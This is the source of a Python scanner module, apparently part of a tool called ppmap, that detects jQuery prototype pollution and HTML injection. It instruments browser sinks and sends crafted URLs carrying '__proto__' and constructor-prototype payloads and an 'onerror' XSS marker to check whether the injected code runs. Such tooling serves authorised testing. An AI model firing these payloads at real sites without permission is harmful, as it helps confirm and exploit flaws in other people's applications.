"""
REACHABILITY MODULE — ppmap v4.5
================================
Mengisi celah: verdict ppmap lama murni versi-based ("VULNERABLE to CVE-X" walau
tidak ada jalur serangan). Modul ini menambahkan pengukuran NYATA:

    tier 1: LIBRARY_VULNERABLE   -> versi rentan ada (indikator, bukan bukti)
    tier 2: REACHABLE_FROM_URL   -> canary dari URL/query/hash SAMPAI sink
    tier 3: VERIFIED_EXECUTION   -> payload dieksekusi (alert/onerror jalan)

Teknik: instrumentasi sink pra-navigasi via CDP addScriptToEvaluateOnNewDocument
(alternatif DOM Invader), canary unik per-scan.

AUTHORIZED SECURITY TESTING ONLY. Non-destruktif: tidak ada submit/POST ke target.
"""
import json
import time
import urllib.parse
from typing import Any, Dict, List, Optional

CANARY_PREFIX = "ppmap_rc_"


def make_canary(scan_id: Optional[str] = None) -> str:
    """Canary unik per-scan supaya hit bisa diatribusi."""
    if not scan_id:
        scan_id = str(int(time.time() * 1000) % 10_000_000)
    return f"{CANARY_PREFIX}{scan_id}"


# Sink wrapper: catat setiap pemanggilan sink yang melewati canary
INSTRUMENTATION_JS = r"""
(function(){
  if (window.__ppmap_rc_installed) return;
  window.__ppmap_rc_installed = true;
  window.__ppmap_rc_hits = [];
  var CANARY = '__PPMAP_CANARY__';
  function rec(sink, data){ try {
    window.__ppmap_rc_hits.push({sink:sink, data:String(data).slice(0,200), t:Date.now()});
  } catch(e){} }

  function wrap(obj, name, label){
    try{
      if (typeof obj !== 'function') return;
      var orig = obj;
      var wrapped = function(){
        for (var i=0;i<arguments.length;i++){
          if (String(arguments[i]).indexOf(CANARY) !== -1) rec(label, arguments[i]);
          if (typeof arguments[i] === 'string' &&
              (arguments[i].indexOf('__proto__')!== -1 || arguments[i].indexOf('constructor') !== -1)) {
            rec(label+':protostr', arguments[i]);
          }
        }
        return orig.apply(this, arguments);
      };
      // salin properti (jQuery.fn punya banyak)
      for (var k in orig){ try{ wrapped[k] = orig[k]; }catch(e){} }
      wrapped.prototype = orig.prototype;
    }catch(e){}
  }

  // PENTING: jQuery mungkin belum termuat saat skrip ini jalan (pra-navigasi).
  // Teknik DOM-Invader: perangkap pendefinisian window.jQuery/__jQuery/$,
  // lalu pasang wrapper TEPAT SETELAH library ada.
  function installJqHooks(jq) {
    if (!jq || jq.__ppmap_wrapped) return;
    try { jq.__ppmap_wrapped = true; } catch(e){ return; }
    try{
      var origExtend = jq.extend;
      jq.extend = function(){
        for (var i=0;i<arguments.length;i++){
          var s;
          try { s = typeof arguments[i] === 'string' ? arguments[i] : JSON.stringify(arguments[i]); } catch(e){ s = String(arguments[i]); }
          if (s && s.indexOf(CANARY) !== -1) rec('jQuery.extend', s);
        }
        return origExtend.apply(this, arguments);
      };
      // $.fn.init: jQuery <1.9 memperlakukan string '<tag...>' sebagai HTML
      var origInit = jq.fn.init;
      var newInit = function(selector){
        try{
          if (typeof selector === 'string'){
            if (selector.indexOf(CANARY) !== -1) rec('jQuery.init(selector)', selector);
            if (selector.charAt(0) === '<') rec('jQuery.init(HTML-string)', selector);
          }
        }catch(e){}
        return new origInit(selector, arguments[1], arguments[2]);
      };
      newInit.prototype = origInit.prototype;
      jq.fn.init = newInit;

      if (jq.parseJSON) {
        var origParseJSON = jq.parseJSON;
        jq.parseJSON = function(s){
          try{ if (String(s).indexOf(CANARY) !== -1) rec('jQuery.parseJSON', s);
               if (String(s).indexOf('__proto__') !== -1) rec('jQuery.parseJSON:protostr', s); }catch(e){}
          return origParseJSON.apply(this, arguments);
        };
      }
      if (jq.fn.html) {
        var origHtml = jq.fn.html;
        jq.fn.html = function(v){
          try{ if (v !== undefined && String(v).indexOf(CANARY) !== -1) rec('jQuery.fn.html', v); }catch(e){}
          return origHtml.apply(this, arguments);
        };
      }
      rec('instrumented', 'jQuery ' + (jq.fn ? jq.fn.jquery : '?'));
    }catch(e){}
  }
  window.__ppmap_installJqHooks = installJqHooks;
  ['jQuery', '$'].forEach(function(prop){
    try{
      var val = window[prop];
      Object.defineProperty(window, prop, {
        get: function(){ return val; },
        set: function(v){ val = v; try{ installJqHooks(v); }catch(e){} },
        configurable: true
      });
    }catch(e){}
    try{ installJqHooks(window[prop]); }catch(e){}
  });
  try{
    var origEval = window.eval;
    window.eval = function(s){
      try{ if (String(s).indexOf(CANARY) !== -1) rec('window.eval', s); }catch(e){}
      return origEval.apply(this, arguments);
    };
  }catch(e){}
  try{
    var d = Object.getOwnPropertyDescriptor(Element.prototype, 'innerHTML');
    Object.defineProperty(Element.prototype, 'innerHTML', {
      set: function(v){ try{ if (String(v).indexOf(CANARY) !== -1) rec('innerHTML', v); }catch(e){} return d.set.call(this, v); },
      get: function(){ return d.get.call(this); },
      configurable: true
    });
  }catch(e){}
})();
"""

EXEC_MARKER_JS = "window.__ppmap_rc_exec"

# Payload reachability dikelompokkan by entry point
REACH_URL_PAYLOADS = [
    # (label, path_suffix, payload_desc)
    ("hash_json",       '#{"__proto__":{"{k}":1}}',                            "hash -> JSON.parse -> extend"),
    ("hash_ctor_json",  '#{"constructor":{"prototype":{"{k}":1}}}',            "hash -> constructor.prototype"),
    ("query_bracket",   "&x[__proto__][{k}]=1",                                "query bracket -> deparam -> extend"),
    ("query_direct",    "&__proto__[{k}]=1",                                   "query langsung __proto__"),
    ("query_ctor",      "&constructor[prototype][{k}]=1",                      "query bracket constructor"),
    ("query_json",      "&json={q}",                                           "query JSON string"),
    ("hash_html_canary","#{q}",                                                "hash -> $(string) HTML gadget"),
    ("query_html",      "&html={q}",                                           "query -> $(string) HTML gadget"),
]

# Marker eksekusi klasik (tanpa alert — headless friendly)
EXEC_PAYLOAD_HTML = "<img src=x onerror=\"{exec_marker}=1\">"


def build_instrumentation(canary: str) -> str:
    return INSTRUMENTATION_JS.replace("__PPMAP_CANARY__", canary)


def build_reach_urls(base_url: str, canary: str) -> List[Dict[str, str]]:
    """Bangun daftar URL (label, url, desc) utk tiap vektor reachability.

    Setiap URL diberi param unik (_ppmap_rc=<n>) supaya tiap vektor adalah
    FULL navigation (bukan same-document fragment) — script onload jalan lagi.
    """
    out = []
    q = urllib.parse.quote(f"<img src=x onerror=\"{EXEC_MARKER_JS}=1;window['{canary}']=1\">")
    html_payload = f"<img src=x onerror=\"{EXEC_MARKER_JS}=1;window['{canary}']=1\">"
    for i, (label, tpl, desc) in enumerate(REACH_URL_PAYLOADS):
        suffix = tpl.replace("{k}", canary).replace("{q}", urllib.parse.quote(html_payload))
        sep = "&" if "?" in base_url else "?"
        unique = f"{sep}_ppmap_rc={i}" + (f"&_pp=" if False else "")
        # hash harus paling belakang; jika tpl sudah punya hash, taruh unik sebelum hash
        if "#" in suffix:
            frag_idx = suffix.index("#")
            full = base_url + unique + suffix[:frag_idx] + suffix[frag_idx:]
        else:
            full = base_url + suffix + unique
        out.append({"label": label, "url": full, "desc": desc})
    return out


def collect_hits(driver) -> List[Dict[str, Any]]:
    try:
        return driver.execute_script("return (window.__ppmap_rc_hits || []);") or []
    except Exception:
        return []


def execution_fired(driver, canary: str) -> bool:
    """True bila payload HTML benar-benar dieksekusi (onerror jalan)."""
    try:
        return bool(driver.execute_script(
            f"return !!({EXEC_MARKER_JS} || window['{canary}']);"
        ))
    except Exception:
        return False


def reach_verdict(hits: List[Dict[str, Any]], canary: str, executed: bool) -> Dict[str, Any]:
    """Vokabuler verdict 3 tingkat + bukti."""
    canary_hits = [h for h in hits if canary in json.dumps(h, default=str)]
    proto_hits = [h for h in hits if ":protostr" in h.get("sink", "")]
    if executed:
        tier, name = 3, "VERIFIED_EXECUTION"
    elif canary_hits:
        tier, name = 2, "REACHABLE_FROM_URL"
    elif proto_hits:
        tier, name = 1.5, "SINK_SEES_PROTO_STRING"
    else:
        tier, name = 1, "LIBRARY_VULNERABLE_ONLY"
    return {
        "tier": tier,
        "verdict": name,
        "canary": canary,
        "canary_hits": canary_hits,
        "proto_hits": proto_hits,
        "total_sink_calls": len(hits),
    }
